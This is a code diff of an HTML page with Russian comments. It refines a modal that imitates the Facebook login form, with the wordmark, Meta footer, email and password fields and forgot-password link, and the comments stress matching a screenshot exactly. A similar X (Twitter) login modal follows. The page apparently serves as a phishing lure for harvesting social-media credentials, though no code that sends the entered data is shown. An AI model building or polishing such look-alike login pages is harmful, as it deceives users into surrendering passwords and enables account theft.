@@ -358,7 +358,7 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
         }
 
-        /* Обновленные стили для Facebook окна - ТОЧНО КАК НА СКРИНШОТЕ */
+        /* ОБНОВЛЕННЫЕ стили для Facebook окна - ТОЧНО ПО СКРИНШОТУ */
         .facebook-modal-content {
             background: #f0f2f5;
             color: #1c1e21;
@@ -367,7 +367,7 @@
 
         /* Верхняя часть с языком */
         .facebook-language-header {
-            padding: 16px;
+            padding: 12px 16px;
             text-align: right;
             border-bottom: 1px solid #dadde1;
             background: #fff;
@@ -378,6 +378,7 @@
             border: none;
             color: #1877f2;
             font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
             padding: 4px 8px;
             border-radius: 4px;
@@ -390,7 +391,7 @@
 
         /* Основной контент */
         .facebook-content {
-            padding: 20px;
+            padding: 16px;
             background: #fff;
             margin: 0;
             display: flex;
@@ -399,32 +400,19 @@
             flex: 1;
         }
 
-        /* Логотип Meta */
-        .meta-logo-container {
-            margin-bottom: 20px;
+        /* Логотип Facebook - ИСПРАВЛЕННЫЙ */
+        .facebook-logo-container {
+            margin: 24px 0 20px;
             text-align: center;
-        }
-
-        .meta-logo {
-            width: 40px;
-            height: 40px;
-            background: linear-gradient(135deg, #1877f2, #42b72a);
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 10px;
-            color: white;
-            font-size: 20px;
-            font-weight: bold;
         }
 
         .facebook-logo {
             color: #1877f2;
             font-size: 40px;
             font-weight: bold;
-            margin-bottom: 16px;
+            margin: 0 auto;
             letter-spacing: -1px;
+            font-family: Arial, Helvetica, sans-serif;
         }
 
         /* Форма */
@@ -472,33 +460,37 @@
             background: #166fe5;
         }
 
+        /* Ссылка "Забыли пароль?" - ЧЕРНАЯ */
         .forgot-password-link {
             display: block;
             text-align: center;
-            color: #1877f2;
+            color: #1c1e21 !important;
             text-decoration: none;
             font-size: 14px;
             margin-bottom: 20px;
             padding: 16px 0;
             border-bottom: 1px solid #dadde1;
+            font-weight: 500;
         }
 
         .forgot-password-link:hover {
             text-decoration: underline;
+            color: #1c1e21;
         }
 
-        /* Кнопка создания аккаунта */
+        /* Кнопка создания аккаунта - ИСПРАВЛЕННАЯ */
         .facebook-create-container {
             margin-top: 20px;
             padding-top: 20px;
             border-top: 1px solid #dadde1;
             width: 100%;
             max-width: 364px;
+            display: flex;
+            justify-content: center;
         }
 
         .facebook-create-button {
-            width: auto;
-            padding: 12px 20px;
+            padding: 12px 16px;
             background: #42b72a;
             color: white;
             border: none;
@@ -506,28 +498,46 @@
             font-size: 17px;
             font-weight: bold;
             cursor: pointer;
-            display: block;
-            margin: 0 auto;
             transition: background-color 0.2s;
+            white-space: nowrap;
         }
 
         .facebook-create-button:hover {
             background: #36a420;
         }
 
-        /* Футер */
+        /* Футер - ИСПРАВЛЕННЫЙ */
         .facebook-footer {
             background: #fff;
-            padding: 20px;
-            font-size: 14px;
-            color: #8a8d91;
+            padding: 20px 16px;
+            font-size: 12px;
+            color: #737373;
             text-align: center;
             border-top: 1px solid #dadde1;
             margin-top: auto;
         }
 
+        .footer-meta {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-bottom: 12px;
+        }
+
+        .meta-icon {
+            width: 16px;
+            height: 16px;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%231877F2" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>') no-repeat center;
+            background-size: contain;
+        }
+
+        .footer-meta span {
+            color: #737373;
+            font-size: 12px;
+        }
+
         .footer-links {
-            margin-top: 20px;
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
@@ -535,15 +545,16 @@
         }
 
         .footer-links a {
-            color: #8a8d91;
+            color: #737373;
             text-decoration: none;
+            font-size: 11px;
         }
 
         .footer-links a:hover {
             text-decoration: underline;
         }
 
-        /* Стили для Twitter (X) окна 2025 */
+        /* Стили для Twitter (X) окна */
         .twitter-modal-content {
             background: #000;
             color: #fff;
@@ -1321,7 +1332,7 @@
         </div>
     </div>
 
-    <!-- Обновленное модальное окно входа в Facebook (точно как на скриншоте) -->
+    <!-- ИСПРАВЛЕННОЕ модальное окно входа в Facebook -->
     <div class="modal-overlay" id="facebookModal">
         <div class="modal-content facebook-modal-content">
             <!-- Верхняя часть с языком -->
@@ -1331,9 +1342,8 @@
             
             <!-- Основной контент -->
             <div class="facebook-content">
-                <!-- Логотип Meta -->
-                <div class="meta-logo-container">
-                    <div class="meta-logo">M</div>
+                <!-- Логотип Facebook -->
+                <div class="facebook-logo-container">
                     <div class="facebook-logo">facebook</div>
                 </div>
                 
@@ -1342,7 +1352,7 @@
                     <input type="text" class="facebook-input" id="fbEmail" placeholder="Мобильный телефон или эл. адрес" required>
                     <input type="password" class="facebook-input" id="fbPassword" placeholder="Пароль" required>
                     
-                    <button type="submit" class="facebook-login-button">Вход</button>
+                    <button type="submit" class="facebook-login-button">Войти</button>
                     
                     <a href="#" class="forgot-password-link" id="forgotPassword">Забыли пароль?</a>
                 </form>
@@ -1357,7 +1367,10 @@
             
             <!-- Футер -->
             <div class="facebook-footer">
-                Meta
+                <div class="footer-meta">
+                    <div class="meta-icon"></div>
+                    <span>Meta</span>
+                </div>
                 <div class="footer-links">
                     <a href="#">Информация</a>
                     <a href="#">Справка</a>
@@ -1367,7 +1380,7 @@
         </div>
     </div>
 
-    <!-- Модальное окно входа в X (Twitter) 2025 -->
+    <!-- Модальное окно входа в X (Twitter) -->
     <div class="modal-overlay" id="twitterModal">
         <div class="modal-content twitter-modal-content">
             <div class="twitter-header">
